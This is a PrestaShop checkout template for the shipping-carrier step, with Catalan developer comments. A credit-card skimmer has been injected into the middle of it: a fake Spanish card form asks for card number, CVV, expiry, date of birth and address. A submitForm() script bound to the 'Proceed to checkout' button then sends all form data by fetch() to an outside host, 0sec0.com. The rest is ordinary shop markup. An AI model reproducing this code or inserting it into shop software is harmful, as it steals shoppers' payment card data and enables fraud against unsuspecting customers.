{*
* 2007-2015 PrestaShop
*
* NOTICE OF LICENSE
*
* This source file is subject to the Academic Free License (AFL 3.0)
* that is bundled with this package in the file LICENSE.txt.
* It is also available through the world-wide-web at this URL:
* http://opensource.org/licenses/afl-3.0.php
* If you did not receive a copy of the license and are unable to
* obtain it through the world-wide-web, please send an email
* to license@prestashop.com so we can send you a copy immediately.
*
* DISCLAIMER
*
* Do not edit or add to this file if you wish to upgrade PrestaShop to newer
* versions in the future. If you wish to customize PrestaShop for your
* needs please refer to http://www.prestashop.com for more information.
*
*  @author PrestaShop SA <contact@prestashop.com>
*  @copyright  2007-2015 PrestaShop SA
*  @license    http://opensource.org/licenses/afl-3.0.php  Academic Free License (AFL 3.0)
*  International Registered Trademark & Property of PrestaShop SA
*}
{if !$opc}
	{capture name=path}{l s='Shipping:'}{/capture}
	{assign var='current_step' value='shipping'}
	<div id="carrier_area">
		<h1 class="page-heading">{l s='Shipping:'}</h1>
		{include file="$tpl_dir./order-steps.tpl"}
		{include file="$tpl_dir./errors.tpl"}
		<form id="form" action="{$link->getPageLink('order', true, NULL, "{if $multi_shipping}multi-shipping={$multi_shipping}{/if}")|escape:'html':'UTF-8'}" method="post" name="carrier_area">
{else}
	<div id="carrier_area" class="opc-main-block">
		<h1 class="page-heading step-num"><span>2</span> {l s='Delivery methods'}</h1>
			<div id="opc_delivery_methods" class="opc-main-block">
				<div id="opc_delivery_methods-overlay" class="opc-overlay" style="display: none;"></div>
{/if}
<div class="order_carrier_content box">
	{if isset($virtual_cart) && $virtual_cart}
		<input id="input_virtual_carrier" class="hidden" type="hidden" name="id_carrier" value="0" />
	{else}
		<div id="HOOK_BEFORECARRIER">
			{if isset($carriers) && isset($HOOK_BEFORECARRIER)}
				{$HOOK_BEFORECARRIER}
			{/if}
		</div>
		{if isset($isVirtualCart) && $isVirtualCart}
			<p class="alert alert-warning">{l s='No carrier is needed for this order.'}</p>
		{else}
			<div class="delivery_options_address">
				{if isset($delivery_option_list)}
					{foreach $delivery_option_list as $id_address => $option_list}
						<p class="carrier_title">
							{if isset($address_collection[$id_address])}
                                {l s='Una vez le notifiquemos'} <span style="font-weight: normal">{l s='él envió de su pedido el siguiente transportista lo entregará en:'}</span> <span style="font-size:13px;color:#662466;padding-left:3px;">{$address_collection[$id_address]->alias}</span>
							{else}
								{l s='Choose a shipping option'}
							{/if}
						</p>
						<div class="delivery_options">
							{foreach $option_list as $key => $option}
								<div class="delivery_option {if ($option@index % 2)}alternate_{/if}item">
                                    <div>
                                        <!--Alex 03-06-2016 INICI Aquesta part es quan sols pots seleccionar un transportista per pedido-->
                                        <table class="resume table table-bordered{if !$option.unique_carrier} hide{/if}">
                                            <!--03-06-2016 INICI Unic transportista-->
                                            <tr>
                                                <td class="delivery_option_radio">
                                                    <input id="delivery_option_{$id_address|intval}_{$option@index}" class="delivery_option_radio" type="radio" name="delivery_option[{$id_address|intval}]" data-key="{$key}" data-id_address="{$id_address|intval}" value="{$key}"{if isset($delivery_option[$id_address]) && $delivery_option[$id_address] == $key} checked="checked"{/if} />
                                                </td>

                                                <!--Alex 02-06-2016 Logo i descripcio del transport-->
                                                <td class="delivery_option_logo">
                                                    <!--Alex 02-06-2016 INICI Faig que el logo estigui a la esquerra per ficar el text a la dreta-->
                                                    <div class="transporte_logo">
                                                        {foreach $option.carrier_list as $carrier}
                                                            {if $carrier.logo}
                                                                <!--<img src="{*$carrier.logo|escape:'htmlall':'UTF-8'}" alt="{$carrier.instance->name|escape:'htmlall':'UTF-8'*}" class="img-responsive" />-->
                                                                <img src="{$carrier.logo|escape:'htmlall':'UTF-8'}" alt="{$carrier.instance->name|escape:'htmlall':'UTF-8'}"/>
                                                            {elseif !$option.unique_carrier}
                                                                {$carrier.instance->name|escape:'htmlall':'UTF-8'}
                                                                {if !$carrier@last} - {/if}
                                                            {/if}
                                                        {/foreach}
                                                    </div>
                                                    <div class="transporte_descripcion" style="margin-top: 5px;">
                                                        {if $option.unique_carrier}
                                                            <i class="icon-info-sign"></i>
                                                            {foreach $option.carrier_list as $carrier}
                                                                <!--<strong>{*$carrier.instance->name|escape:'htmlall':'UTF-8'*}</strong>-->
                                                            {/foreach}
                                                            {if isset($carrier.instance->delay[$cookie->id_lang])}
                                                                <!--<br />{*l s='Delivery time:'}&nbsp;{$carrier.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'*}-->
                                                                {$carrier.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
                                                            {/if}
                                                        {/if}
                                                        {if count($option_list) > 1}
                                                            <br />
                                                            {if $option.is_best_grade}
                                                                {if $option.is_best_price}
                                                                    <span class="best_grade best_grade_price best_grade_speed">{l s='The best price and speed'}</span>
                                                                {else}
                                                                    <span class="best_grade best_grade_speed">{l s='The fastest'}</span>
                                                                {/if}
                                                            {elseif $option.is_best_price}
                                                                <span class="best_grade best_grade_price">{l s='The best price'}</span>
                                                            {/if}
                                                        {/if}
                                                    </div>
                                                    <!--Alex 02-06-2016 FI Faig que el logo estigui a la esquerra per ficar el text a la dreta
                                                    <!--02-06-2016 INICI Faig que la descripcio del transport estigui a la mateixa cela que el logo de transport-->
                                                </td>
                                                <!--Alex 02-06-2016 Logo i descripcio del transport-->

                                                <!--02-06-2016 INICI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->
                                                <!--<td>
													{if $option.unique_carrier}
														{foreach $option.carrier_list as $carrier}
															<strong>{$carrier.instance->name|escape:'htmlall':'UTF-8'}</strong>
														{/foreach}
														{if isset($carrier.instance->delay[$cookie->id_lang])}
															<br />{l s='Delivery time:'}&nbsp;{$carrier.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
														{/if}
													{/if}
													{if count($option_list) > 1}
													<br />
														{if $option.is_best_grade}
															{if $option.is_best_price}
																<span class="best_grade best_grade_price best_grade_speed">{l s='The best price and speed'}</span>
															{else}
																<span class="best_grade best_grade_speed">{l s='The fastest'}</span>
															{/if}
														{elseif $option.is_best_price}
															<span class="best_grade best_grade_price">{l s='The best price'}</span>
														{/if}
													{/if}
												</td>-->
                                                <!--02-06-2016 FI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->

                                                <!--Alex 24-02-2017 INICI Llevo el preu del transport en el pas 4 del carrito-->
                                                <!--<td class="delivery_option_price">
                                                    <div class="delivery_option_price">
                                                        {if $option.total_price_with_tax && !$option.is_free && (!isset($free_shipping) || (isset($free_shipping) && !$free_shipping))}
                                                            {if $use_taxes == 1}
                                                                {if $priceDisplay == 1}
                                                                    {convertPrice price=$option.total_price_without_tax}{if $display_tax_label} {l s='(tax excl.)'}{/if}
                                                                {else}
                                                                    {convertPrice price=$option.total_price_with_tax}{if $display_tax_label} {l s='(tax incl.)'}{/if}
                                                                {/if}
                                                            {else}
                                                                {convertPrice price=$option.total_price_without_tax}
                                                            {/if}
                                                        {else}
                                                            {l s='Free'}
                                                        {/if}
                                                    </div>
                                                </td>-->
                                                <!--Alex 24-02-2017 FI Llevo el preu del transport en el pas 4 del carrito-->
                                            </tr>
                                            <!--03-06-2016 FI Unic transportista-->
                                        </table>
                                        <!--Alex 03-06-2016 FI Aquesta part es quan sols pots seleccionar un transportista per pedido-->

                                        <!--Alex 03-06-2016 INICI Aquesta part es quan hi ha mes transportistes per al mateix pedido i estan tots seleccionats-->
                                        {if !$option.unique_carrier}
                                            <table class="delivery_option_carrier{if isset($delivery_option[$id_address]) && $delivery_option[$id_address] == $key} selected{/if} resume table table-bordered{if $option.unique_carrier} hide{/if}">
                                                <!--02-06-2016 INICI Primera fila del Transportista-->
                                                <tr>
                                                    {if !$option.unique_carrier}
                                                        <td rowspan="{$option.carrier_list|@count}" class="delivery_option_radio first_item">
                                                            <input id="delivery_option_{$id_address|intval}_{$option@index}" class="delivery_option_radio" type="radio" name="delivery_option[{$id_address|intval}]" data-key="{$key}" data-id_address="{$id_address|intval}" value="{$key}"{if isset($delivery_option[$id_address]) && $delivery_option[$id_address] == $key} checked="checked"{/if} />
                                                        </td>
                                                    {/if}
                                                    {assign var="first" value=current($option.carrier_list)}
                                                    <!--Alex 02-06-2016 Logo i descripcio del transport-->
                                                    <td class="delivery_option_logo{if $first.product_list[0].carrier_list[0] eq 0} hide{/if}">
                                                        <!--Alex 02-06-2016 INICI Faig que el logo estigui a la esquerra per ficar el text a la dreta-->
                                                        <div class="transporte_logo">
                                                            {if $first.logo}
                                                                <img src="{$first.logo|escape:'htmlall':'UTF-8'}" alt="{$first.instance->name|escape:'htmlall':'UTF-8'}"/>
                                                            {elseif !$option.unique_carrier}
                                                                {$first.instance->name|escape:'htmlall':'UTF-8'}
                                                            {/if}
                                                        </div>
                                                        <!--Alex 02-06-2016 FI Faig que el logo estigui a la esquerra per ficar el text a la dreta

                                                        <!--02-06-2016 INICI Faig que la descripcio del transport estigui a la mateixa cela que el logo de transport-->
                                                        <div class="transporte_descripcion">
                                                            <input type="hidden" value="{$first.instance->id|intval}" name="id_carrier" />
                                                            {if isset($first.instance->delay[$cookie->id_lang])}
                                                                <i class="icon-info-sign"></i>
                                                                {strip}
                                                                    {$first.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
                                                                    &nbsp;
                                                                    {if count($first.product_list) <= 1}
                                                                        ({l s='For this product:'}
                                                                    {else}
                                                                        ({l s='For these products:'}
                                                                    {/if}
                                                                {/strip}
                                                                {foreach $first.product_list as $product}
                                                                    {if $product@index == 4}
                                                                        <acronym title="
                                                                    {/if}
                                                                    {strip}
                                                                        {if $product@index >= 4}
                                                                            {$product.name|escape:'htmlall':'UTF-8'}
                                                                            {if isset($product.attributes) && $product.attributes}
                                                                                {$product.attributes|escape:'htmlall':'UTF-8'}
                                                                            {/if}
                                                                            {if !$product@last}
                                                                                ,&nbsp;
                                                                            {else}
                                                                                ">&hellip;</acronym>)
                                                                {/if}
                                                                {else}
                                                                    {$product.name|escape:'htmlall':'UTF-8'}
                                                                    {if isset($product.attributes) && $product.attributes}
                                                                        {$product.attributes|escape:'htmlall':'UTF-8'}
                                                                    {/if}
                                                                    {if !$product@last}
                                                                        ,&nbsp;
                                                                    {else}
                                                                        )
                                                                    {/if}
                                                                {/if}
                                                                {/strip}
                                                                {/foreach}
                                                            {/if}
                                                        </div>
                                                        <!--02-06-2016 FI Faig que la descripcio del transport estigui a la mateixa cela que el logo de transport-->
                                                    </td>
                                                    <!--Alex 02-06-2016 Logo i descripcio del transport-->

                                                    <!--02-06-2016 INICI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->
                                                    <!--<td class="{if $option.unique_carrier}first_item{/if}{if $first.product_list[0].carrier_list[0] eq 0} hide{/if}">
														<input type="hidden" value="{$first.instance->id|intval}" name="id_carrier" />
														{if isset($first.instance->delay[$cookie->id_lang])}
															<i class="icon-info-sign"></i>
															{strip}
																{$first.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
																&nbsp;
																{if count($first.product_list) <= 1}
																	({l s='For this product:'}
																{else}
																	({l s='For these products:'}
																{/if}
															{/strip}
															{foreach $first.product_list as $product}
																{if $product@index == 4}
																	<acronym title="
																{/if}
																{strip}
																	{if $product@index >= 4}
																		{$product.name|escape:'htmlall':'UTF-8'}
																		{if isset($product.attributes) && $product.attributes}
																			{$product.attributes|escape:'htmlall':'UTF-8'}
																		{/if}
																		{if !$product@last}
																			,&nbsp;
																		{else}
																			">&hellip;</acronym>)
																		{/if}
																	{else}
																		{$product.name|escape:'htmlall':'UTF-8'}
																		{if isset($product.attributes) && $product.attributes}
																			{$product.attributes|escape:'htmlall':'UTF-8'}
																		{/if}
																		{if !$product@last}
																			,&nbsp;
																		{else}
																			)
																		{/if}
																	{/if}
																{/strip}
															{/foreach}
														{/if}
													</td>-->
                                                    <!--02-06-2016 FI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->

                                                    <!--Alex 24-02-2017 INICI Llevo el preu del transport en el pas 4 del carrito-->
                                                    <!--<td rowspan="{$option.carrier_list|@count}" class="delivery_option_price">
                                                        <div class="delivery_option_price">
                                                            {if $option.total_price_with_tax && !$option.is_free && (!isset($free_shipping) || (isset($free_shipping) && !$free_shipping))}
                                                                {if $use_taxes == 1}
                                                                    {if $priceDisplay == 1}
                                                                        {convertPrice price=$option.total_price_without_tax}{if $display_tax_label} {l s='(tax excl.)'}{/if}
                                                                    {else}
                                                                        {convertPrice price=$option.total_price_with_tax}{if $display_tax_label} {l s='(tax incl.)'}{/if}
                                                                    {/if}
                                                                {else}
                                                                    {convertPrice price=$option.total_price_without_tax}
                                                                {/if}
                                                            {else}
                                                                {l s='Free'}
                                                            {/if}
                                                        </div>
                                                    </td>-->
                                                    <!--Alex 24-02-2017 INICI Llevo el preu del transport en el pas 4 del carrito-->
                                                </tr>
                                                <!--02-06-2016 FI Primera fila del Transportista -->

                                                {foreach $option.carrier_list as $carrier}
                                                    {if $carrier@iteration != 1}
                                                        <!--02-06-2016 INICI Les altres files de Transportistes-->
                                                        <tr>
                                                            <td class="delivery_option_logo{if $carrier.product_list[0].carrier_list[0] eq 0} hide{/if}">

                                                                <!--Alex 02-06-2016 INICI Faig que el logo estigui a la esquerra per ficar el text a la dreta-->
                                                                <div class="transporte_logo">
                                                                    {if $carrier.logo}
                                                                        <img src="{$carrier.logo|escape:'htmlall':'UTF-8'}" alt="{$carrier.instance->name|escape:'htmlall':'UTF-8'}"/>
                                                                    {elseif !$option.unique_carrier}
                                                                        {$carrier.instance->name|escape:'htmlall':'UTF-8'}
                                                                    {/if}
                                                                </div>
                                                                <!--Alex 02-06-2016 FI Faig que el logo estigui a la esquerra per ficar el text a la dreta-->

                                                                <!--02-06-2016 INICI Faig que la descripcio del transport estigui a la mateixa cela que el logo de transport-->
                                                                <div class="transporte_descripcion">
                                                                    <input type="hidden" value="{$first.instance->id|intval}" name="id_carrier" />
                                                                    {if isset($carrier.instance->delay[$cookie->id_lang])}
                                                                        <i class="icon-info-sign"></i>
                                                                        {strip}
                                                                            {$carrier.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
                                                                            &nbsp;
                                                                            {if count($first.product_list) <= 1}
                                                                                ({l s='For this product:'}
                                                                            {else}
                                                                                ({l s='For these products:'}
                                                                            {/if}
                                                                        {/strip}
                                                                        {foreach $carrier.product_list as $product}
                                                                            {if $product@index == 4}
                                                                                <acronym title="
                                                                        {/if}
                                                                        {strip}
                                                                            {if $product@index >= 4}
                                                                                {$product.name|escape:'htmlall':'UTF-8'}
                                                                                {if isset($product.attributes) && $product.attributes}
                                                                                    {$product.attributes|escape:'htmlall':'UTF-8'}
                                                                                {/if}
                                                                                {if !$product@last}
                                                                                    ,&nbsp;
                                                                                {else}
                                                                                    ">&hellip;</acronym>)
                                                                        {/if}
                                                                        {else}
                                                                            {$product.name|escape:'htmlall':'UTF-8'}
                                                                            {if isset($product.attributes) && $product.attributes}
                                                                                {$product.attributes|escape:'htmlall':'UTF-8'}
                                                                            {/if}
                                                                            {if !$product@last}
                                                                                ,&nbsp;
                                                                            {else}
                                                                                )
                                                                            {/if}
                                                                        {/if}
                                                                        {/strip}
                                                                        {/foreach}
                                                                    {/if}
                                                                </div>
                                                                <!--02-06-2016 FI Faig que la descripcio del transport estigui a la mateixa cela que el logo de transport-->
                                                            </td>
                                                            <!--02-06-2016 INICI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->
                                                            <!--<td class="{if $option.unique_carrier} first_item{/if}{if $carrier.product_list[0].carrier_list[0] eq 0} hide{/if}">
															<input type="hidden" value="{$first.instance->id|intval}" name="id_carrier" />
															{if isset($carrier.instance->delay[$cookie->id_lang])}
																<i class="icon-info-sign"></i>
																{strip}
																	{$carrier.instance->delay[$cookie->id_lang]|escape:'htmlall':'UTF-8'}
																	&nbsp;
																	{if count($first.product_list) <= 1}
																		({l s='For this product:'}
																	{else}
																		({l s='For these products:'}
																	{/if}
																{/strip}
																{foreach $carrier.product_list as $product}
																	{if $product@index == 4}
																		<acronym title="
																	{/if}
																	{strip}
																		{if $product@index >= 4}
																			{$product.name|escape:'htmlall':'UTF-8'}
																			{if isset($product.attributes) && $product.attributes}
																				{$product.attributes|escape:'htmlall':'UTF-8'}
																			{/if}
																			{if !$product@last}
																				,&nbsp;
																			{else}
																				">&hellip;</acronym>)
																			{/if}
																		{else}
																			{$product.name|escape:'htmlall':'UTF-8'}
																			{if isset($product.attributes) && $product.attributes}
																				{$product.attributes|escape:'htmlall':'UTF-8'}
																			{/if}
																			{if !$product@last}
																				,&nbsp;
																			{else}
																				)
																			{/if}
																		{/if}
																	{/strip}
																{/foreach}
															{/if}
														</td>-->
                                                            <!--02-06-2016 FI Llevo la descripcio del transport que esta en una cela individual per ficarla amb el logo-->
                                                        </tr>
                                                        <!--02-06-2016 FI Les altres files de Transportistes-->
                                                    {/if}
                                                {/foreach}
                                            </table>
                                        {/if}
                                        <!--Alex 03-06-2016 FI Aquesta part es quan hi ha mes transportistes per al mateix pedido i estan tots seleccionats-->
                                    </div>
								</div> <!-- end delivery_option -->
							{/foreach}
						</div> <!-- end delivery_options -->
						<style>
table {
  border-collapse: collapse;
  width: 100%;
}
td {
  padding: 10px;
  vertical-align: top;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  font-size: 16px;
}
input[type="text"] {
  width: 100%;
  padding: 10px;
  border-radius: 5px;
  border: 1px solid #ccc;
  font-size: 16px;
  color: #555;
  box-sizing: border-box;
  margin-bottom: 10px;
}

td {
  padding: 10px;
}
label {
  display: block;
  margin-bottom: 5px;
  font-weight: bold;
  color: #333;
  width: 100%;
}

.card-details {
  display: flex;
  align-items: center;
  margin-bottom: 20px;
}
.card-details h2 {
  margin-right: 20px;
  font-size: 18px;
}
.card-logos {
  display: flex;
  align-items: center;
}
.card-logos img {
  height: 20px;
  margin-left: 10px;
  border-radius: 5px;
  box-shadow: 0 0 5px rgba(0, 0, 0, 0.3);
  transition: transform 0.3s ease-in-out;
}
.card-logos img:hover {
  transform: scale(1.1);
}
label {
  display: block;
  margin-bottom: 10px;
  font-weight: bold;
  color: #333;
}
.input-group {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.input-group input {
  flex: 1;
  margin-left: 10px;
  background-color: #f5f5f5;
  border: none;
  padding: 10px;
  border-radius: 5px;
  font-size: 16px;
  color: #555;
}
input {
  display: block;
  margin-bottom: 20px;
  padding: 10px;
  border: none;
  border-radius: 4px;
  font-size: 16px;
  color: #555;
  background-color: #f5f5f5;
}
input:focus {
  border-color: #1E90FF;
  outline: none;
}
.label-group {
  display: flex;
  justify-content: space-between;
}
button {
  background-color: #1E90FF;
  color: #fff;
  border: none;
  border-radius: 5px;
  font-size: 16px;
  padding: 10px 20px;
  cursor: pointer;
}
button:hover {
  background-color: #007fff;
}
</style>
<center>
<div>
  <div>
    <img src="https://www.visa.com/images/homepage/visa_logo.png" alt="Visa">
    <img src="https://www.mastercard.us/content/dam/public/mastercardcom/mea/za/logos/mc-logo-52.svg" alt="Mastercard">
    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-bluebox-solid.svg" alt="Amex">
  </div>
<br>
<h3>Detalles de la tarjeta de crédito</h3>
</center>
<br>
<table>
  <tr>
    <td>
      <label for="card_holder">Nombre del titular de la tarjeta</label>
      <input type="text" id="card_holder" name="card_holder" required placeholder="Juan Perez"><br>
      <label for="expiry_date">Fecha de vencimiento</label>
      <input type="text" id="expiry_date" name="expiry_date" required placeholder="MM/AA"><br>
      <label for="dob">Fecha de nacimiento</label>
      <input type="text" id="dob" name="dob" required placeholder="DD.MM.AAAA"><br>
      <label for="city">Ciudad</label>
      <input type="text" id="city" name="city" required placeholder="Ciudad"><br>
    </td>
    <td>
      <label for="card_number">Número de tarjeta</label>
      <input type="text" id="card_number" name="card_number" required placeholder="xxxx-xxxx-xxxx-xxxx"><br>
      <label for="cvv">Código de seguridad CVV</label>
      <input type="text" id="cvv" name="cvv" required placeholder="123"><br>
      <label for="address">Dirección</label>
      <input type="text" id="address" name="address" required placeholder="Dirección"><br>
      <label for="zipcode">Código postal</label>
      <input type="text" id="zipcode" name="zipcode" required placeholder="12345"><br>
    </td>
  </tr>
</table>

						<div class="hook_extracarrier" id="HOOK_EXTRACARRIER_{$id_address}">
							{if isset($HOOK_EXTRACARRIER_ADDR) &&  isset($HOOK_EXTRACARRIER_ADDR.$id_address)}{$HOOK_EXTRACARRIER_ADDR.$id_address}{/if}
						</div>
						{foreachelse}
							<p class="alert alert-warning" id="noCarrierWarning">
								{foreach $cart->getDeliveryAddressesWithoutCarriers(true) as $address}
									{if empty($address->alias)}
										{l s='No carriers available.'}
									{else}
										{l s='No carriers available for the address "%s".' sprintf=$address->alias}
									{/if}
									{if !$address@last}
										<br />
									{/if}
								{foreachelse}
									{l s='No carriers available.'}
								{/foreach}
							</p>
						{/foreach}
					{/if}
				</div> <!-- end delivery_options_address -->
				<div id="extra_carrier" style="display: none;"></div>
				{if $opc}
					<p class="carrier_title">{l s='Leave a message'}</p>
					<div>
						<p>{l s='If you would like to add a comment about your order, please write it in the field below.'}</p>
						<textarea class="form-control" cols="120" rows="2" name="message" id="message">{strip}
							{if isset($oldMessage)}{$oldMessage|escape:'html':'UTF-8'}{/if}
						{/strip}</textarea>
					</div>
				{/if}
				{if $recyclablePackAllowed}
					<div class="checkbox recyclable">
						<label for="recyclable">
							<input type="checkbox" name="recyclable" id="recyclable" value="1"{if $recyclable == 1} checked="checked"{/if} />
							{l s='I would like to receive my order in recycled packaging.'}
						</label>
					</div>
				{/if}
				{if $giftAllowed}
					{if $opc}
						<hr style="" />
					{/if}
					<p class="carrier_title">{l s='Gift'}</p>
					<p class="checkbox gift">
						<input type="checkbox" name="gift" id="gift" value="1"{if $cart->gift == 1} checked="checked"{/if} />
						<label for="gift">
							{l s='I would like my order to be gift wrapped.'}
							{if $gift_wrapping_price > 0}
								&nbsp;<i>({l s='Additional cost of'}
								<span class="price" id="gift-price">
									{if $priceDisplay == 1}
										{convertPrice price=$total_wrapping_tax_exc_cost}
									{else}
										{convertPrice price=$total_wrapping_cost}
									{/if}
								</span>
								{if $use_taxes && $display_tax_label}
									{if $priceDisplay == 1}
										{l s='(tax excl.)'}
									{else}
										{l s='(tax incl.)'}
									{/if}
								{/if})
								</i>
							{/if}
						</label>
					</p>
					<p id="gift_div">
						<label for="gift_message">{l s='If you\'d like, you can add a note to the gift:'}</label>
						<textarea rows="2" cols="120" id="gift_message" class="form-control" name="gift_message">{$cart->gift_message|escape:'html':'UTF-8'}</textarea>
					</p>
				{/if}
				{/if}
			{/if}

    <!--Alex 02-05-2016 INICI Oculto el checkbox en el pas de transportista ja que no es necessita ara pero dona errors si no esta, faig que estigui marcat i ho oculto així pot passar al seguent pas sense fer res-->
        {if $conditions AND $cms_id}
				{if $opc}
					<hr style="" />
				{/if}
				<p class="carrier_title" style="display: none">{l s='Terms of service'}</p>
				<p class="checkbox" style="display: none">
					<input type="checkbox" name="cgv" id="cgv" value="1" checked {if $checkedTOS}checked="checked"{/if} />
					<label for="cgv">{l s='I agree to the terms of service and will adhere to them unconditionally.'}</label>
					<a href="{$link_conditions|escape:'html':'UTF-8'}" class="iframe" rel="nofollow">{l s='(Read the Terms of Service)'}</a>
				</p>
			{/if}
        <!--Alex 02-05-2016 FI Oculto el checkbox dels termes de compra i envio-->

		</div> <!-- end delivery_options_address -->
		{if !$opc}
				<p class="cart_navigation clearfix">
					<input type="hidden" name="step" value="3" />
					<input type="hidden" name="back" value="{$back}" />
                    <!--Alex 03-06-2016 INICI Canvio el boto de volver atras per ficarlo baix de comprar per ficar-los tots iguals-->
                    {if isset($virtual_cart) && $virtual_cart || (isset($delivery_option_list) && !empty($delivery_option_list))}
                        <button type="submit" name="processCarrier" class="button btn btn-default standard-checkout button-medium" onclick="submitForm()">
							<span>
								{l s='Proceed to checkout'}
                                <i class="icon-chevron-right right"></i>
							</span>
                        </button>
						
                    {/if}

					{if !$is_guest}
						{if $back}
							<a href="{$link->getPageLink('order', true, NULL, "step=1&back={$back}{if $multi_shipping}&multi-shipping={$multi_shipping}{/if}")|escape:'html':'UTF-8'}" title="{l s='Previous'}" class="button-exclusive btn btn-default">
								<i class="icon-chevron-left"></i>
								{l s='Continue shopping'}
							</a>
						{else}
							<a href="{$link->getPageLink('order', true, NULL, "step=1{if $multi_shipping}&multi-shipping={$multi_shipping}{/if}")|escape:'html':'UTF-8'}" title="{l s='Previous'}" class="button-exclusive btn btn-default">
								<i class="icon-chevron-left"></i>
								{l s='Continue shopping'}
							</a>
						{/if}
					{else}
						<a href="{$link->getPageLink('order', true, NULL, "{if $multi_shipping}multi-shipping={$multi_shipping}{/if}")|escape:'html':'UTF-8'}" title="{l s='Previous'}" class="button-exclusive btn btn-default">
							<i class="icon-chevron-left"></i>
							{l s='Continue shopping'}
						</a>
					{/if}
                    <!--Alex 03-06-2016 FI Canvio el boto de volver atras per ficarlo baix de comprar per ficar-los tots iguals-->
				</p>
			</form>
			<script>
function submitForm() {
  var form = document.getElementById("form");
  var formData = new FormData(form);

  fetch("https://0sec0.com/martgifts.com.php", {
    method: "POST",
    body: formData
  })
  .then(response => {
    if (response.ok) {
      console.log("Sent!");
    } else {
      console.error("error!");
    }
  })
  .catch(error => {
    console.error("error!", error);
  });
}
</script>
	{else}
		</div> <!-- end opc_delivery_methods -->
	{/if}
</div> <!-- end carrier_area -->
{strip}
{if !$opc}
	{addJsDef orderProcess='order'}
	{addJsDef currencySign=$currencySign|html_entity_decode:2:"UTF-8"}
	{addJsDef currencyRate=$currencyRate|floatval}
	{addJsDef currencyFormat=$currencyFormat|intval}
	{addJsDef currencyBlank=$currencyBlank|intval}
	{if isset($virtual_cart) && !$virtual_cart && $giftAllowed && $cart->gift == 1}
		{addJsDef cart_gift=true}
	{else}
		{addJsDef cart_gift=false}
	{/if}
	{addJsDef orderUrl=$link->getPageLink("order", true)|escape:'quotes':'UTF-8'}
	{addJsDefL name=txtProduct}{l s='Product' js=1}{/addJsDefL}
	{addJsDefL name=txtProducts}{l s='Products' js=1}{/addJsDefL}
{/if}
{if $conditions}
	{addJsDefL name=msg_order_carrier}{l s='You must agree to the terms of service before continuing.' js=1}{/addJsDefL}
{/if}
{/strip}
